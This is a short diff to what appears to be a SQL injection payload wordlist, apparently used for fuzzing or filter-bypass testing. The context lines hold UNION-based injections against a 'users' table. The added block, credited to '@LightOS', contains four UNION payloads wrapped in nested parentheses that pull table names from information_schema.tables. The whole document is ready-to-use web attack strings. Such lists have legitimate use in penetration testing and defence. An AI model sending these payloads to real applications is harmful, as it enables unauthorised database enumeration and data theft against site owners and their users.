@@ -198,3 +198,9 @@ xxx union (select xxx from users limit 1,1)
 1 union (select 's' from users limit 1,1)
 xxx union (select 's' from users limit 1,1)
 @version union (select 's' from users limit 1,1)
+
+# thanks @LightOS
+-1 union(((select table_name from information_schema.tables limit 1,1)))
+'1' union(((select table_name from information_schema.tables limit 1,1)))
+@foo union(((select table_name from information_schema.tables limit 1,1)))
+id union(((select table_name from information_schema.tables limit 1,1)))
